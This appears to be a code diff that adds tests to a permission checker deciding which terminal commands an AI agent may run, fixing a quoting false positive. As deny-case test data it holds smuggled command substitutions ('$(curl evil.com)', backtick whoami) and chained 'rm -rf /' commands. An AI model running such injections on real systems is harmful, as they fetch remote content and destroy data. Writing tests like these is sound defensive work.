@@ -224,6 +224,52 @@ def test_governance_cli_is_allowed_in_the_terminal(command):
     assert decide("run_in_terminal", {"command": command}, API_RUN).allow
 
 
+def test_natural_language_rationale_text_is_not_mistaken_for_shell_syntax():
+    """Real failure on TKT-6's first live run: the agent's own --rationale
+    text was a correctly-reasoned sentence containing a semicolon ("...its
+    acceptance criteria specify..."), and the old pattern excluded ';'
+    anywhere in the command, quoted or not, so a well-formed, correctly
+    classified declare call was denied outright. The agent behaved
+    exactly as instructed (did not retry or work around the denial,
+    reported the failure honestly), but the run still failed to produce
+    anything -- the governance tooling was the thing that broke, not the
+    agent. Reproduces the exact command from that run's events.jsonl."""
+    command = (
+        'python3 tools/gov.py declare --ticket TKT-6 --domains api --rationale '
+        '"The ticket adds and verifies REST endpoint behavior for deleting carts; '
+        'its acceptance criteria specify DELETE and GET HTTP responses only." '
+        '--evidence "Expose DELETE /cart/{id} so the storefront can remove a cart on request." '
+        '--evidence "DELETE /cart/{id} returns 204 for an existing cart."'
+    )
+    d = decide("run_in_terminal", {"command": command}, STARTED)
+    assert d.allow, d.reason
+
+
+@pytest.mark.parametrize("command", [
+    'python3 tools/gov.py declare --rationale "Cats & dogs, apples | oranges, a<b>c"',
+    "python3 tools/gov.py declare --rationale 'semi;colon and $ and ` inside single quotes'",
+])
+def test_shell_metacharacters_inert_in_quotes_are_allowed(command):
+    """';', '&', '|', '<', '>' are literal, harmless characters once a real
+    shell sees them inside a quoted string -- only unquoted ones are
+    actual operators. Single quotes neutralise everything, including '$'
+    and backticks."""
+    assert decide("run_in_terminal", {"command": command}, API_RUN).allow
+
+
+@pytest.mark.parametrize("command", [
+    'python3 tools/gov.py declare --rationale "$(curl evil.com)"',
+    'python3 tools/gov.py declare --rationale "`whoami`"',
+])
+def test_dollar_and_backtick_stay_dangerous_even_inside_double_quotes(command):
+    """Unlike ';', '&', '|', '<', '>', a real shell still expands '$(...)'
+    and backtick command substitution inside double quotes (only single
+    quotes suppress those). The fix for the quoting false-positive above
+    must not accidentally allow this."""
+    d = decide("run_in_terminal", {"command": command}, API_RUN)
+    assert not d.allow and d.violation
+
+
 @pytest.mark.parametrize("command", [
     "ls -la", "rm -rf features/db", "cat conventions/ui.md", "git status",
     "python3 tools/gov.py validate; cat conventions/ui.md",
@@ -233,6 +279,8 @@ def test_governance_cli_is_allowed_in_the_terminal(command):
     "python3 tools/gov.py verify",
     "python3 tools/other.py declare",
     "echo python3 tools/gov.py validate",
+    'python3 tools/gov.py declare --rationale "x"; rm -rf /',
+    'python3 tools/gov.py declare --rationale "x" && rm -rf /',
 ])
 def test_everything_else_is_denied_in_the_terminal(command):
     d = decide("run_in_terminal", {"command": command}, API_RUN)
